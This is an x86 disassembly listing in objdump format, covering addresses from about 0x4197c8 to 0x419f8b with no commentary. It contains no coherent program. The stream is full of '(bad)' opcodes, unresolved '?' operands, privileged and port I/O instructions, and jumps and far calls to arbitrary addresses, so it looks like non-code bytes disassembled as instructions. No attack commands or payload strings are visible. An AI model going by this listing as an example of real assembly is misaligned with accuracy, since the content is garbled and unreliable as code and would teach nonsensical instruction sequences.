  4197c8:	and    BYTE PTR [ebx+0x6b74be4f],bl
  4197ce:	daa    
  4197cf:	out    0x17,al
  4197d1:	fidivr DWORD PTR [edx]
  4197d3:	sahf   
  4197d4:	adc    bl,BYTE PTR [ecx-0x5]
  4197d7:	into   
  4197d8:	daa    
  4197d9:	int3   
  4197da:	imul   ebp,DWORD PTR [edx+edx*8+0x279ac079],0x510cc7b5
  4197e5:	adc    BYTE PTR [ebx+0x4c],0xaa
  4197e9:	mul    BYTE PTR [edi-0x713b7dd2]
  4197ef:	push   0x5d
  4197f1:	mov    al,ds:0xef3f8c71
  4197f6:	fidivr WORD PTR [ebp-0x452407dc]
  4197fc:	push   esi
  4197fd:	clc    
  4197fe:	push   ebp
  4197ff:	ss mov eax,0xd161cfc4
  419805:	inc    esp
  419806:	rcl    BYTE PTR [edi-0x7f3b3811],1
  41980c:	loop   0x4197b6
  41980e:	inc    edi
  41980f:	retf   0x87e5
  419812:	pop    eax
  419813:	out    dx,al
  419814:	aaa    
  419815:	adc    al,ch
  419817:	mov    eax,ds:0xf2f68b58
  41981c:	fmulp  st(6),st
  41981e:	js     0x4197b8
  419820:	add    eax,0xdacbf712
  419825:	or     ecx,DWORD PTR [ebx-0x69728953]
  41982b:	mov    WORD PTR [esi-0x60],?
  41982e:	fs popf 
  419830:	mov    dh,0x88
  419832:	inc    BYTE PTR [esi+0x75]
  419835:	pop    edi
  419836:	xchg   ecx,eax
  419837:	lahf   
  419838:	(bad)  
  41983a:	cmp    al,0x13
  41983c:	aas    
  41983d:	(bad)  
  41983f:	daa    
  419840:	fcom   QWORD PTR [edx+0x40e86cb9]
  419846:	aas    
  419847:	lods   eax,DWORD PTR ds:[esi]
  419848:	mov    dl,0x49
  41984a:	cmp    esp,DWORD PTR [ebp+0x454c19be]
  419850:	push   edx
  419851:	icebp  
  419852:	mov    dl,0xba
  419854:	xchg   BYTE PTR [eax],ch
  419856:	les    edx,FWORD PTR [esi]
  419858:	addr16 dec eax
  41985a:	ret    0xaa33
  41985d:	enter  0x365a,0x9b
  419861:	lods   al,BYTE PTR ds:[esi]
  419862:	inc    eax
  419863:	fistp  WORD PTR [edi-0x13]
  419866:	push   esp
  419867:	add    al,0x86
  419869:	addr16 jnp 0x4197f5
  41986c:	outs   dx,BYTE PTR ds:[esi]
  41986d:	out    0xe1,eax
  41986f:	scas   al,BYTE PTR es:[edi]
  419870:	outs   dx,BYTE PTR ds:[esi]
  419871:	gs daa 
  419873:	aad    0x8e
  419875:	push   esp
  419876:	jo     0x4198f4
  419878:	out    0xbc,eax
  41987a:	cmp    bl,BYTE PTR [edx]
  41987c:	inc    ecx
  41987d:	jbe    0x419833
  41987f:	jge    0x419863
  419881:	fcmovb st,st(2)
  419883:	leave  
  419884:	or     al,0x0
  419886:	jnp    0x4198df
  419888:	jbe    0x41981d
  41988a:	(bad)  
  41988b:	mov    ch,0xe6
  41988d:	pop    edi
  41988e:	pop    edi
  41988f:	jbe    0x4198c8
  419891:	enter  0xfbf2,0x5
  419895:	fbstp  TBYTE PTR [edi+eiz*8]
  419898:	add    BYTE PTR [ebx+0xf],ch
  41989b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41989c:	(bad)  
  41989e:	mov    WORD PTR [edx-0x799e1ff1],fs
  4198a4:	pop    eax
  4198a5:	xor    BYTE PTR [eax+0x68],0xe0
  4198a9:	pop    ecx
  4198aa:	ret    
  4198ab:	shl    esi,1
  4198ad:	test   DWORD PTR [ecx+0x49f5e40d],esi
  4198b3:	sbb    eax,esi
  4198b5:	or     eax,0x88061fe2
  4198ba:	sbb    al,0xd1
  4198bc:	inc    edi
  4198bd:	cwde   
  4198be:	xchg   DWORD PTR [edi],edi
  4198c0:	mov    ecx,0xe9ad162f
  4198c5:	mov    ds:0x1ec624c3,eax
  4198ca:	scas   eax,DWORD PTR es:[edi]
  4198cb:	sbb    eax,DWORD PTR [esi-0x6e]
  4198ce:	(bad)  
  4198cf:	repnz ficomp WORD PTR [esp+eax*2+0x61]
  4198d4:	ret    0x8ebd
  4198d7:	push   esi
  4198d8:	stos   BYTE PTR es:[edi],al
  4198d9:	addr16 out dx,al
  4198db:	es mov esi,0x3cc19caf
  4198e1:	or     al,0x7
  4198e3:	popa   
  4198e4:	pop    ss
  4198e5:	dec    esp
  4198e6:	cmp    BYTE PTR [esi-0x4],dl
  4198e9:	test   al,0x2c
  4198eb:	or     eax,0xa24f391e
  4198f0:	mov    ebx,0x9111e296
  4198f5:	xchg   DWORD PTR [ecx-0x6192bf90],ecx
  4198fb:	jno    0x419929
  4198fd:	jmp    0x419919
  4198ff:	cmp    DWORD PTR [edi-0x6d2f6893],ebp
  419905:	dec    ebp
  419906:	pop    ecx
  419907:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  419909:	out    0x14,eax
  41990b:	mov    cl,0xce
  41990d:	mov    al,BYTE PTR [eax]
  41990f:	popf   
  419910:	sbb    edi,DWORD PTR [eax-0x40055035]
  419916:	sbb    eax,DWORD PTR [esi+0x9]
  419919:	jnp    0x41990d
  41991b:	mov    ss,WORD PTR [esi+0x5]
  41991e:	sar    ch,1
  419920:	mov    ah,0x1e
  419922:	inc    ebx
  419923:	test   eax,0xafb53f08
  419928:	bound  edx,QWORD PTR [ebp-0x5d]
  41992b:	mov    ah,0xba
  41992d:	sub    DWORD PTR [edi-0xab0a2b5],0xd4dc0ed6
  419937:	pop    ss
  419938:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419939:	mov    DWORD PTR [edi-0x25],esi
  41993c:	lods   eax,DWORD PTR ds:[esi]
  41993d:	int    0x51
  41993f:	dec    ebx
  419940:	mov    bl,0xe6
  419942:	mov    edi,0xc6868813
  419947:	retf   
  419948:	out    dx,al
  419949:	xlat   BYTE PTR ds:[ebx]
  41994a:	inc    DWORD PTR [eax-0x2eb92576]
  419950:	mov    cl,0xb
  419952:	fidivr DWORD PTR [edi+eax*8]
  419955:	pusha  
  419956:	shl    esp,0xba
  419959:	fs xchg ecx,eax
  41995b:	scas   eax,DWORD PTR es:[edi]
  41995c:	push   eax
  41995d:	out    dx,eax
  41995e:	push   ebp
  41995f:	mov    esi,0xd6b7b1
  419964:	cwde   
  419965:	iret   
  419966:	jne    0x41995c
  419968:	mov    DWORD PTR [ebx],esp
  41996a:	sti    
  41996b:	repnz mov ah,0xba
  41996e:	aad    0x2c
  419970:	jmp    0xb1b3929a
  419975:	and    bl,dl
  419977:	mov    ebp,0xc7f0f92a
  41997c:	ret    
  41997d:	dec    ebp
  41997e:	int    0x3d
  419980:	pusha  
  419981:	fisubr DWORD PTR [eax-0x194d07e6]
  419987:	in     al,0xd2
  419989:	pushf  
  41998a:	(bad)  [eax+0x7be70be2]
  419990:	ins    DWORD PTR es:[edi],dx
  419991:	ins    BYTE PTR es:[edi],dx
  419992:	push   es
  419993:	mov    dh,BYTE PTR [edi+0x2ba8a145]
  419999:	mov    ebp,0x54470f74
  41999e:	ror    BYTE PTR [ebx],0x1d
  4199a1:	fistp  DWORD PTR [edi-0x29d120f4]
  4199a7:	clc    
  4199a8:	pop    ss
  4199a9:	and    edi,DWORD PTR [ebx]
  4199ab:	xchg   ebp,eax
  4199ac:	stc    
  4199ad:	inc    esi
  4199ae:	out    dx,eax
  4199af:	fwait
  4199b0:	jl     0x4199e3
  4199b2:	pop    ebp
  4199b3:	xchg   esp,eax
  4199b4:	push   ebp
  4199b5:	mov    ah,0x68
  4199b7:	adc    BYTE PTR [eax-0x37],dh
  4199ba:	pop    eax
  4199bb:	mov    ebp,0xd627586a
  4199c0:	mov    edx,0x42869688
  4199c5:	xchg   ecx,eax
  4199c6:	and    DWORD PTR [esi],edx
  4199c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199c9:	xchg   edi,eax
  4199ca:	fdivr  DWORD PTR [ecx+0x5fed673e]
  4199d0:	fs inc esp
  4199d2:	mov    dh,0xdc
  4199d4:	mov    esp,ebp
  4199d6:	cmp    dl,bh
  4199d8:	mov    edi,0x7bb0cd93
  4199dd:	pop    ecx
  4199de:	pop    edi
  4199df:	pop    ds
  4199e0:	pop    ds
  4199e1:	fcomip st,st(2)
  4199e3:	aad    0x28
  4199e5:	jo     0x419a35
  4199e7:	mov    bl,0xda
  4199e9:	in     al,dx
  4199ea:	add    edx,ebp
  4199ec:	adc    DWORD PTR [ecx-0x2be9a73e],ebx
  4199f2:	inc    ebx
  4199f3:	shr    DWORD PTR [edx+0xe],0xa0
  4199f7:	mov    ch,BYTE PTR [ecx+0x23]
  4199fa:	mov    ds:0x8c5339b9,eax
  4199ff:	(bad)  
  419a00:	jno    0x419a1c
  419a02:	inc    esp
  419a03:	cmp    esi,esi
  419a05:	mov    ds:0xc7dd659f,al
  419a0a:	ret    0xcac7
  419a0d:	xor    eax,0xd941bb77
  419a12:	nop
  419a13:	mov    WORD PTR [ebx-0x17126037],?
  419a19:	sub    ecx,DWORD PTR [ebp+0x3ebf9956]
  419a1f:	(bad)  
  419a20:	adc    eax,0xea13dffc
  419a25:	dec    edi
  419a26:	adc    BYTE PTR [esi+0x22],bl
  419a29:	jmp    0x4199f5
  419a2b:	into   
  419a2c:	popf   
  419a2d:	sbb    al,0x48
  419a2f:	lea    edx,[esp+eiz*8]
  419a32:	add    BYTE PTR [ecx],ah
  419a34:	int    0x26
  419a36:	fwait
  419a37:	loopne 0x419a8d
  419a39:	or     dl,ch
  419a3b:	lods   al,BYTE PTR ds:[esi]
  419a3c:	jne    0x419ab1
  419a3e:	pusha  
  419a3f:	adc    bh,BYTE PTR [eax]
  419a41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a42:	xor    DWORD PTR [ebx],esp
  419a44:	jp     0x419a5f
  419a46:	and    DWORD PTR [edx],ebp
  419a48:	inc    esp
  419a49:	inc    eax
  419a4a:	mov    esi,DWORD PTR [edi-0x729f78c4]
  419a50:	int3   
  419a51:	out    dx,eax
  419a52:	sbb    al,0xeb
  419a54:	icebp  
  419a55:	push   ebx
  419a56:	arpl   WORD PTR [ecx-0xd1b3ead],cx
  419a5c:	ds push ds
  419a5e:	xor    DWORD PTR [eax+0x36],ecx
  419a61:	mov    ah,0xda
  419a63:	rol    esp,cl
  419a65:	jo     0x419ab9
  419a67:	mov    cl,0x32
  419a69:	mov    WORD PTR [ebx+0x2f53f82b],fs
  419a6f:	es std 
  419a71:	push   ebp
  419a72:	jae    0x419ab8
  419a74:	pop    edx
  419a75:	pinsrw mm7,WORD PTR [ebp+ecx*2+0x3f],0xd8
  419a7b:	pop    edx
  419a7c:	cwde   
  419a7d:	add    eax,0xce74f736
  419a82:	push   ecx
  419a83:	dec    esi
  419a84:	jno    0x419ac6
  419a86:	sti    
  419a87:	pop    ebx
  419a88:	fnstcw WORD PTR [esi+ebx*2]
  419a8b:	test   al,0x36
  419a8d:	inc    edx
  419a8e:	xor    BYTE PTR [edi+0x0],al
  419a91:	sub    bl,ah
  419a93:	sub    dl,ch
  419a95:	loopne 0x419a99
  419a97:	fwait
  419a98:	push   eax
  419a99:	xchg   esi,eax
  419a9a:	add    edx,DWORD PTR [ebp+ebx*2-0x2]
  419a9e:	fs popf 
  419aa0:	std    
  419aa1:	dec    ebx
  419aa2:	(bad)  
  419aa3:	jnp    0x419aa2
  419aa5:	and    eax,0x9ba2c8d
  419aaa:	xchg   edi,eax
  419aab:	sub    DWORD PTR [ecx],0x26
  419aae:	and    eax,0xcf097e84
  419ab3:	pop    ss
  419ab4:	jo     0x419a9b
  419ab6:	test   DWORD PTR ds:0xc11d6137,edx
  419abc:	clts   
  419abe:	jne    0x419ae9
  419ac0:	sbb    edx,DWORD PTR [ebp+0x71]
  419ac3:	or     al,BYTE PTR [esi-0x6454bfa7]
  419ac9:	std    
  419aca:	icebp  
  419acb:	ret    0x33fb
  419ace:	jo     0x419ac8
  419ad0:	rcl    dh,1
  419ad2:	and    bl,BYTE PTR cs:[ebx]
  419ad5:	shl    DWORD PTR [ecx],cl
  419ad7:	pushf  
  419ad8:	dec    eax
  419ad9:	and    BYTE PTR [edx+eiz*2],dl
  419adc:	pop    ss
  419add:	push   ds
  419ade:	in     al,dx
  419adf:	xchg   BYTE PTR [eax-0x9],dl
  419ae2:	lods   al,BYTE PTR ds:[esi]
  419ae3:	iretw  
  419ae5:	dec    edi
  419ae6:	and    DWORD PTR [ebx-0xd9aba36],edx
  419aec:	int3   
  419aed:	fld    DWORD PTR [ebp-0x4c6d73bb]
  419af3:	sub    esi,DWORD PTR [eax-0x16d3e660]
  419af9:	sub    eax,0x2c149ead
  419afe:	aam    0x9
  419b00:	push   es
  419b01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b02:	xor    DWORD PTR [edx+0x6ee29226],ecx
  419b08:	(bad)  
  419b09:	std    
  419b0a:	sub    ebx,ebx
  419b0c:	test   eax,0x75c9c276
  419b11:	and    eax,0x76f71697
  419b16:	push   eax
  419b17:	cdq    
  419b18:	xchg   ebp,eax
  419b19:	aad    0x70
  419b1b:	or     al,0x53
  419b1d:	aam    0xc9
  419b1f:	dec    edx
  419b20:	and    edx,edi
  419b22:	or     DWORD PTR [edi+0x48],eax
  419b25:	mov    ecx,0x4d8945ad
  419b2a:	out    0x8a,eax
  419b2c:	fs xchg ebx,eax
  419b2e:	aad    0xcd
  419b30:	retf   0xe596
  419b33:	pop    esp
  419b34:	dec    edx
  419b35:	or     al,0xfe
  419b37:	xor    BYTE PTR [edx+edi*1-0x4fa29f98],0x7c
  419b3f:	dec    esp
  419b40:	mov    bh,0x36
  419b42:	xchg   ecx,eax
  419b43:	xor    al,0xf2
  419b45:	lods   al,BYTE PTR ds:[esi]
  419b46:	pop    esi
  419b47:	jo     0x419b7a
  419b49:	lods   eax,DWORD PTR ds:[esi]
  419b4a:	(bad)
  419b4e:	cmp    ch,BYTE PTR [ebp-0x4c2ea5b]
  419b54:	xor    bh,BYTE PTR [esp+esi*4]
  419b57:	add    ah,BYTE PTR [esi-0xd]
  419b5a:	add    eax,0xe13ac48a
  419b5f:	jg     0x419bd5
  419b61:	ror    DWORD PTR [edx+0x2084fee2],1
  419b67:	xlat   BYTE PTR ds:[ebx]
  419b68:	xchg   ebp,eax
  419b69:	jle    0x419be7
  419b6b:	push   ebx
  419b6c:	and    eax,0x7e395d45
  419b71:	adc    al,0xdc
  419b73:	rep stos BYTE PTR es:[edi],al
  419b75:	not    ch
  419b77:	or     esi,DWORD PTR [edx+edx*8+0x3958cc33]
  419b7e:	push   ss
  419b7f:	add    al,0xce
  419b81:	mov    cs,WORD PTR [edx+0x4b]
  419b84:	cli    
  419b85:	daa    
  419b86:	mov    ecx,0x2cdff83c
  419b8b:	jae    0x419b75
  419b8d:	cmp    al,0x88
  419b8f:	arpl   WORD PTR [edx],si
  419b91:	adc    eax,DWORD PTR [ebp-0x19]
  419b94:	dec    ebp
  419b95:	sub    ebp,DWORD PTR [esi]
  419b97:	push   ss
  419b98:	xor    al,0xf7
  419b9a:	in     eax,dx
  419b9b:	in     eax,0xff
  419b9d:	out    0xd9,al
  419b9f:	push   cs
  419ba0:	rcl    BYTE PTR [eax],cl
  419ba2:	jo     0x419bbe
  419ba4:	div    DWORD PTR [eax+0xdf95637]
  419baa:	lea    ebx,[edx+0x34396c14]
  419bb0:	sub    DWORD PTR [ecx+0x24],ebp
  419bb3:	or     cl,BYTE PTR [edx+eax*8]
  419bb6:	rsm    
  419bb8:	dec    esp
  419bb9:	iret   
  419bba:	fstp   TBYTE PTR [edi-0x5523af3f]
  419bc0:	jnp    0x419bb7
  419bc2:	pushf  
  419bc3:	(bad)  
  419bc4:	loopne 0x419c2b
  419bc6:	ds xor ah,dh
  419bc9:	push   ebx
  419bca:	jecxz  0x419bad
  419bcc:	adc    eax,0x2a5472ae
  419bd1:	mov    edx,0x41c045fa
  419bd6:	je     0x419bea
  419bd8:	sub    al,0xe0
  419bda:	dec    eax
  419bdb:	lods   eax,DWORD PTR ds:[esi]
  419bdc:	or     al,0xd1
  419bde:	add    DWORD PTR [edx-0x5cd8e197],0xffffffc0
  419be5:	sbb    BYTE PTR [eax-0x1f588b68],ch
  419beb:	xor    dh,BYTE PTR [esi+ecx*8]
  419bee:	mov    cl,0xc2
  419bf0:	and    dl,ah
  419bf2:	repz add al,0x9a
  419bf5:	js     0x419c64
  419bf7:	cwde   
  419bf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419bf9:	sbb    ecx,DWORD PTR [edi]
  419bfb:	and    al,0xba
  419bfd:	je     0x419bfa
  419bff:	shl    ebp,cl
  419c01:	mov    ch,0x3c
  419c03:	mov    esp,0x58631ab6
  419c08:	xchg   edi,eax
  419c09:	cmp    DWORD PTR fs:[ecx-0x66],ecx
  419c0d:	inc    esi
  419c0e:	jae    0x419c5b
  419c10:	mov    esi,0x3f702e0
  419c15:	dec    ebx
  419c16:	pushf  
  419c17:	adc    BYTE PTR [eax+0x9],ah
  419c1a:	icebp  
  419c1b:	add    bl,BYTE PTR [ebx+0x4f9fa932]
  419c21:	ret    
  419c22:	pop    ebx
  419c23:	jno    0x419be4
  419c25:	pop    edx
  419c26:	int3   
  419c27:	idiv   bl
  419c29:	jno    0x419ca2
  419c2b:	xor    ch,dh
  419c2d:	dec    ebx
  419c2e:	cmp    BYTE PTR ds:0x757d5671,0xe3
  419c35:	sahf   
  419c36:	lea    esi,[ecx-0x492a2b8b]
  419c3c:	stc    
  419c3d:	daa    
  419c3e:	push   cs
  419c3f:	push   ds
  419c40:	enter  0x79e3,0x35
  419c44:	in     al,dx
  419c45:	imul   ebp,DWORD PTR [eax+0x3c],0xe1e04885
  419c4c:	sub    DWORD PTR [edx+edi*2],esi
  419c4f:	push   0xd871c499
  419c54:	xor    eax,0x24f7fa02
  419c59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c5a:	jg     0x419c90
  419c5c:	test   bl,cl
  419c5e:	xor    esp,DWORD PTR [eax-0x4456f711]
  419c64:	push   eax
  419c65:	hlt    
  419c66:	clc    
  419c67:	stos   BYTE PTR es:[edi],al
  419c68:	imul   ecx,DWORD PTR [eax+eiz*1+0x1c],0x4f
  419c6d:	dec    edx
  419c6e:	fimul  DWORD PTR [edi]
  419c70:	xchg   BYTE PTR [ecx],bh
  419c72:	add    eax,0xd8a94487
  419c77:	pop    esi
  419c78:	and    eax,0xd2d7affb
  419c7d:	gs call 0xa592:0x5e612923
  419c85:	iret   
  419c86:	push   0xffffffbc
  419c88:	xchg   esi,eax
  419c89:	xchg   DWORD PTR [ecx+0x3bab415f],ecx
  419c8f:	adc    al,BYTE PTR [ecx+0x648d4c3a]
  419c95:	fdivr  QWORD PTR [ebp+0x5360c566]
  419c9b:	jno    0x419cf5
  419c9d:	leave  
  419c9e:	pop    ebp
  419c9f:	mov    al,0xec
  419ca1:	(bad)  
  419ca2:	das    
  419ca3:	mov    bl,0x19
  419ca5:	or     al,0x29
  419ca7:	sub    BYTE PTR [esi+0x746883a2],dh
  419cad:	aas    
  419cae:	xchg   ebx,eax
  419caf:	pop    edi
  419cb0:	(bad)  
  419cb2:	cwde   
  419cb3:	dec    esi
  419cb4:	sahf   
  419cb5:	jg     0x419d2c
  419cb7:	add    BYTE PTR [esi-0x1c],bh
  419cba:	or     eax,0xe17a7e88
  419cbf:	pop    ecx
  419cc0:	jae    0x419c4d
  419cc2:	ja     0x419c5c
  419cc4:	mov    edi,0x21c52693
  419cc9:	push   edx
  419cca:	xchg   cl,al
  419ccc:	and    edi,DWORD PTR ds:0x4dfdcd50
  419cd2:	enter  0xdd34,0xbc
  419cd6:	add    ah,BYTE PTR [edi*2+0x519209f4]
  419cdd:	clc    
  419cde:	inc    eax
  419cdf:	(bad)
  419ce3:	and    BYTE PTR [edx+0x5d64e1c7],ah
  419ce9:	push   ecx
  419cea:	adc    eax,0x5b7845bd
  419cef:	push   ebp
  419cf0:	mov    ah,0xed
  419cf2:	dec    edi
  419cf3:	loope  0x419d6c
  419cf5:	adc    edi,DWORD PTR [ecx+edx*1-0x696dbc20]
  419cfc:	mov    ah,0x75
  419cfe:	mov    al,ds:0x49001e10
  419d03:	hlt    
  419d04:	adc    DWORD PTR [ebx],0xffffffb2
  419d07:	leave  
  419d08:	pop    eax
  419d09:	mov    dh,BYTE PTR [eax-0x34]
  419d0c:	and    BYTE PTR [ebp+0x37524614],bh
  419d12:	pop    esp
  419d13:	or     eax,0x25d57f09
  419d18:	stos   DWORD PTR es:[edi],eax
  419d19:	fcmovbe st,st(5)
  419d1b:	ficomp WORD PTR ds:0x530f132e
  419d21:	mov    cl,0x5f
  419d23:	and    DWORD PTR [eax],0xb6750bb6
  419d29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d2b:	mov    eax,ds:0xe6f1384d
  419d30:	or     ecx,DWORD PTR [ebx]
  419d32:	cmp    BYTE PTR [ebx-0x57],bl
  419d35:	jns    0x419d7b
  419d37:	or     bh,BYTE PTR [ecx]
  419d39:	jp     0x419d8d
  419d3b:	test   eax,0xa742794c
  419d40:	fcomp  QWORD PTR [ecx+0x11]
  419d43:	popa   
  419d44:	dec    ebp
  419d45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d46:	xchg   ecx,eax
  419d47:	inc    ecx
  419d48:	push   ecx
  419d49:	ret    0xc0e5
  419d4c:	inc    edi
  419d4d:	push   eax
  419d4e:	(bad)  
  419d4f:	or     bh,BYTE PTR [edx-0x75]
  419d52:	pop    ss
  419d53:	pop    ds
  419d54:	sub    BYTE PTR [edi-0x56635eb7],bl
  419d5a:	test   DWORD PTR [ecx+0x6c3d295c],ecx
  419d60:	ret    
  419d61:	xchg   ecx,eax
  419d62:	mov    bl,0x4
  419d64:	adc    eax,0x57a69ff5
  419d69:	cmp    ecx,DWORD PTR [edx-0x4ac525ff]
  419d6f:	and    ebx,DWORD PTR [edi-0x44597a9a]
  419d75:	pop    ds
  419d76:	xor    eax,0x558b92ea
  419d7b:	xchg   esi,eax
  419d7c:	(bad)  
  419d7d:	jp     0x419d61
  419d7f:	(bad)  
  419d80:	jns    0x419de7
  419d82:	adc    cl,BYTE PTR [esp+edi*8]
  419d85:	push   0x24fac32d
  419d8a:	dec    edi
  419d8b:	dec    esi
  419d8c:	push   esi
  419d8d:	(bad)  
  419d8e:	adc    al,BYTE PTR [ebp+0x53cc4f20]
  419d94:	sub    ch,BYTE PTR [edi-0x38ff2d83]
  419d9a:	retf   0x1d7f
  419d9d:	outs   dx,DWORD PTR ds:[esi]
  419d9e:	mov    al,0x22
  419da0:	imul   esp,DWORD PTR [edx-0x58620e4a],0x58
  419da7:	xor    ebp,0xe62404cc
  419dad:	xchg   ecx,eax
  419dae:	loopne 0x419d55
  419db0:	jno    0x419d89
  419db2:	inc    esi
  419db3:	out    dx,eax
  419db4:	sbb    DWORD PTR [eax+0xfade65e],edi
  419dba:	pop    esi
  419dbb:	xor    DWORD PTR [esi],esp
  419dbd:	and    edi,DWORD PTR [ecx-0x5b15562a]
  419dc3:	push   esi
  419dc4:	aad    0xa0
  419dc6:	out    0x1,eax
  419dc8:	push   ebx
  419dc9:	xchg   edi,eax
  419dca:	adc    edi,eax
  419dcc:	in     al,0x61
  419dce:	push   ecx
  419dcf:	xchg   ebp,eax
  419dd0:	inc    ebp
  419dd1:	fimul  DWORD PTR [ebp+0x57]
  419dd4:	or     eax,0xe569829c
  419dd9:	lahf   
  419dda:	pop    edi
  419ddb:	call   0xc7d83c1c
  419de0:	clc    
  419de1:	mov    bl,0x8a
  419de3:	mov    dh,al
  419de5:	push   eax
  419de6:	lods   eax,DWORD PTR ds:[esi]
  419de7:	invd   
  419de9:	pop    edx
  419dea:	shr    DWORD PTR [esi+0x27bd258a],cl
  419df0:	push   0x893e737a
  419df5:	pusha  
  419df6:	call   0xc0c7:0x83d5f43d
  419dfd:	test   BYTE PTR [edi-0x4b],cl
  419e00:	sub    BYTE PTR [ecx],dh
  419e02:	loope  0x419e18
  419e04:	or     ebp,ecx
  419e06:	jmp    0xac1f:0x7ea1989f
  419e0d:	inc    esp
  419e0e:	or     cl,cl
  419e10:	mov    al,0xcc
  419e12:	add    dh,BYTE PTR [ebx-0x1f]
  419e15:	add    al,0xea
  419e17:	bound  edi,QWORD PTR [edx]
  419e19:	ret    0xafc2
  419e1c:	jmp    0x51a:0xe2df0536
  419e23:	psrlw  mm3,QWORD PTR [edi]
  419e26:	test   BYTE PTR [edi-0x44],0x1f
  419e2a:	out    0x64,al
  419e2c:	jle    0x419dd4
  419e2e:	sub    bh,BYTE PTR [edi-0x4fb10c8]
  419e34:	idiv   DWORD PTR [eax]
  419e36:	or     DWORD PTR [edi+0x5d08fdb6],0x9708ca45
  419e40:	in     eax,dx
  419e41:	cli    
  419e42:	scas   eax,DWORD PTR es:[edi]
  419e43:	jnp    0x419e57
  419e45:	mov    BYTE PTR [ebp+0x7f],bh
  419e48:	jnp    0x419ea8
  419e4a:	xor    eax,0x427449cb
  419e4f:	inc    esp
  419e50:	es mov esi,esp
  419e53:	xor    BYTE PTR [edi+0x2da17ac5],0x4a
  419e5a:	cmp    esi,esp
  419e5c:	push   eax
  419e5d:	xchg   edi,eax
  419e5e:	int    0xf1
  419e60:	pop    ecx
  419e61:	sbb    eax,0xc412b443
  419e66:	ret    
  419e67:	arpl   WORD PTR [ebp-0x24],dx
  419e6a:	sub    esp,DWORD PTR [edx]
  419e6c:	popa   
  419e6d:	cmp    eax,0xa609e867
  419e72:	dec    edx
  419e73:	ret    
  419e74:	fwait
  419e75:	mov    ecx,0x4c4377d8
  419e7a:	or     bl,BYTE PTR [esi+ebx*4]
  419e7d:	scas   eax,DWORD PTR es:[edi]
  419e7e:	dec    ebp
  419e7f:	xchg   edi,eax
  419e80:	outs   dx,DWORD PTR ds:[esi]
  419e81:	push   0x49
  419e83:	lea    esp,[edi]
  419e85:	addr16 (bad) 
  419e87:	mov    edx,0x1198b254
  419e8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e8d:	mov    ds:0xce903387,eax
  419e92:	or     ecx,DWORD PTR [ebp+0x757dd3e8]
  419e98:	xor    BYTE PTR [edx+0x6bd4d8db],0x80
  419e9f:	shl    DWORD PTR [eax+0x64],cl
  419ea2:	loope  0x419e8c
  419ea4:	cmp    bh,0x2c
  419ea7:	mov    ds,WORD PTR [ecx]
  419ea9:	mov    ds:0x47dab817,eax
  419eae:	jp     0x419e7e
  419eb0:	jb     0x419f1e
  419eb2:	call   0x6ec3:0x7cdfb588
  419eb9:	out    dx,eax
  419eba:	test   al,0x12
  419ebc:	cli    
  419ebd:	out    dx,al
  419ebe:	out    dx,eax
  419ebf:	push   ss
  419ec0:	mov    esp,0x8403eefa
  419ec5:	mov    al,0xc5
  419ec7:	ror    DWORD PTR [esi+0x5f293d2e],0x37
  419ece:	pop    edi
  419ecf:	loop   0x419e8f
  419ed1:	shl    DWORD PTR [ebp+edi*2+0x3fac2983],cl
  419ed8:	jae    0x419f16
  419eda:	push   0x5f
  419edc:	stc    
  419edd:	cld    
  419ede:	mov    ch,bh
  419ee0:	or     BYTE PTR [eax],al
  419ee2:	adc    ebx,DWORD PTR [edx]
  419ee4:	jae    0x419ec1
  419ee6:	push   edx
  419ee7:	out    dx,eax
  419ee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ee9:	bound  ebx,QWORD PTR [ebp-0x1fb4cd5e]
  419eef:	add    bh,ch
  419ef1:	repz sar DWORD PTR [ebx],cl
  419ef4:	mov    esi,0x1345b642
  419ef9:	adc    ecx,DWORD PTR [esi]
  419efb:	retf   
  419efc:	adc    DWORD PTR [ecx+0x3b3ed1d4],esp
  419f02:	and    BYTE PTR [ebx],dh
  419f04:	(bad)  
  419f05:	xchg   edx,eax
  419f06:	jle    0x419f08
  419f08:	arpl   WORD PTR [edi-0x2dc353d2],di
  419f0e:	cli    
  419f0f:	shl    BYTE PTR [ebx+0x76],1
  419f12:	dec    edi
  419f13:	mov    ?,WORD PTR [edi-0x5591d427]
  419f19:	pop    ecx
  419f1a:	cmp    al,0x42
  419f1c:	jnp    0x419ef7
  419f1e:	shl    DWORD PTR [esi-0x2c8b37dd],cl
  419f24:	jg     0x419f4b
  419f26:	mov    ds:0x63c636b8,al
  419f2b:	jae    0x419f22
  419f2d:	and    edi,DWORD PTR [esi*2-0x154c0dd0]
  419f34:	adc    DWORD PTR [ebx],ecx
  419f36:	jns    0x419f0b
  419f38:	add    eax,0x44daf240
  419f3d:	retf   
  419f3e:	stc    
  419f3f:	mov    cl,0x93
  419f41:	mov    al,0xa0
  419f43:	scas   eax,DWORD PTR es:[edi]
  419f44:	mov    dl,0x78
  419f46:	xchg   ecx,eax
  419f47:	dec    ebp
  419f48:	sub    esi,esi
  419f4a:	pop    ebx
  419f4b:	sub    eax,0x96469637
  419f50:	ins    BYTE PTR es:[edi],dx
  419f51:	or     bh,BYTE PTR [esi-0x6e]
  419f54:	lds    edx,FWORD PTR [edx+esi*4-0x1109cc55]
  419f5b:	mov    ds:0x70bfa550,al
  419f60:	dec    ecx
  419f61:	and    DWORD PTR [eax+0x292890d],eax
  419f67:	pop    ss
  419f68:	(bad)  
  419f69:	bound  edi,QWORD PTR [eax+0x337e1fb4]
  419f6f:	mov    bl,0x42
  419f71:	and    DWORD PTR [ecx+0x5aa730e3],eax
  419f77:	or     dl,bl
  419f79:	add    ch,BYTE PTR [edx-0x3b]
  419f7c:	jle    0x419f67
  419f7e:	fldcw  WORD PTR ds:0x57becab5
  419f84:	repz shl BYTE PTR [ebx+0x6fcc20b3],1
  419f8b:	test   BYTE PTR [edi-0x1069a87f],dh
